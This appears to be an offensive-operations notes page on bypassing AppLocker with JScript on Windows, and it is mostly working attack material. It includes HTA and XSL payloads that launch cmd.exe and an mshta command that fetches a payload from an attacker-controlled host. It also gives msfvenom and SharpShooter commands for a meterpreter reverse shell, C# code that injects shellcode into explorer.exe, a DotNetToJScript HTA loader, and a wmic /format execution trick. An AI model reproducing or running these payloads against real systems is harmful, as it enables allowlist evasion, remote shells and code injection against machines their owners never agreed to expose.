---
title: Jscript AppLocker bypass
tags:
  - breach
  - operations
  - applocker
  - bypass
  - jscript
  - allowlist
  - whitelist
---

## Microsoft HTML Applications

**Microsoft HTML Applications (MSHTA)** is a vector for client-side attacks to
execute **JScript** payloads, allowing us to execute `.hta` files with the
`mshta.exe` application. Here's an example payload so we can better understand
its structure:

```html
<html>
  <head>
    <script language="JScript">
      var shell = new ActiveXObject("WScript.Shell")
      var res = shell.Run("cmd.exe")
    </script>
  </head>
  <body>
    <script language="JScript">
      self.close()
    </script>
  </body>
</html>
```

Given the structure of this payload, we can see how we would go about smuggling
our malicious JScript. Here's an example invocation of this payload using
`mshta.exe`:

```powershell
$lHost = ${LHOST}
$lPort = ${LPORT}
. (Get-Command -Name "mshta.exe").Source "http://${lHost}:${lPort}/shell.hta"
```

### MSHTA and SharpShooter

Using [SharpShooter](https://github.com/X0RW3LL/SharpShooter/tree/master) we can
generate an `.hta` payload to deliver a **meterpreter** reverse shell payload.
We invoke the following to generate our meterpreter reverse shell payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.txt
```

And we can generate our **SharpShooter** `.hta` payload by invoking the
following:

```bash
python ~/opt/SharpShooter/SharpShooter.py --payload hta --dotnetver 4 --stageless --rawscfile shell.txt --output shell
```

### MSHTA and DotNetToJScript

Using [DotNetToJscript](https://github.com/tyranid/DotNetToJScript), we can
generate an `.hta` payload to deliver a `meterpreter` reverse shell payload that
uses process injection. We start by building a **.NET Framework** assembly with
the following C# .NET code:

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(
    uint processAccess,
    bool bInheritHandle,
    int processId
    );

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    public TestClass()
    {
        int explorerId = Process.GetProcessesByName("explorer")[0].Id;
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerId);
        IntPtr addr =
            VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        byte[] buf = new byte[854] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41,
            // ...
            0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
        };
        _ = WriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
        _ = CreateRemoteThread(
            hProcess,
            IntPtr.Zero,
            0,
            addr,
            IntPtr.Zero,
            0,
            IntPtr.Zero
        );
    }
}
```

We invoke the following to use **DotNetToJScript** to generate a JScript payload
that will invoke the code within our process injection assembly:

```powershell
DotNetToJScript.exe --lang=JScript -o="pwn.js" "ExampleAssembly.dll"
```

We can test that our `pwn.js` payload works by invoking:

```powershell
. (Get-Command -Name "wscript.exe").Source .\pwn.js
```

To reliably execute our JScript payload we use
[uglify-js](https://www.npmjs.com/package/uglify-js) to minify the payload -
here's an example invocation:

```bash
uglifyjs ./pwn.js > uglypwn.js
```

Finally, we construct our malicious `.hta` payload that contains our minified
DotNetToJScript JScript payload. This final payload will execute using MSHTA,
delivering a JScript payload that loads our assembly to conduct process
injection and execute a meterpreter reverse shell payload:

<!-- prettier-ignore-start -->
```html
<HTML><HEAD></HEAD><BODY><script language="javascript">function setversion(){}function debug(s){}function base64ToStream(b){var enc=new ActiveXObject("System.Text.ASCIIEncoding");var length=enc.GetByteCount_2(b);var ba=enc.GetBytes_4(b);var transform=new ActiveXObject("System.Security.Cryptography.FromBase64Transform");ba=transform.TransformFinalBlock(ba,0,length);var ms=new ActiveXObject("System.IO.MemoryStream");ms.Write(ba,0,length/4*3);ms.Position=0;return ms}var serialized_obj="${INSERT_SERIALIZED_ASSEMBLY_HERE}";var entry_class="TestClass";try{setversion();var stm=base64ToStream(serialized_obj);var fmt=new ActiveXObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter");var al=new ActiveXObject("System.Collections.ArrayList");var d=fmt.Deserialize_2(stm);al.Add(undefined);var o=d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)}catch(e){debug(e.message)}</script><script language="vbscript">self.close</script></body></html>
```
<!-- prettier-ignore-end -->

## XSL

We can also gain arbitrary JScript code executing using **Extensible Stylesheet
Language (XSL)** documents. Here's an example `.xsl` document to gain JScript
code execution:

```xml
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		]]>
	</ms:script>
</stylesheet>
```

We can execute this payload using the **Windows Management Instrumentation
(WMI)** command line application, `wmic`. Here's an example invocation to
execute our `.xsl` file:

```powershell
Start-Process `
	-FilePath (Get-Command -Name "wmic").Source `
	-ArgumentList @("os", "get", '/format:"C:\Tools\shell.xsl"')
```
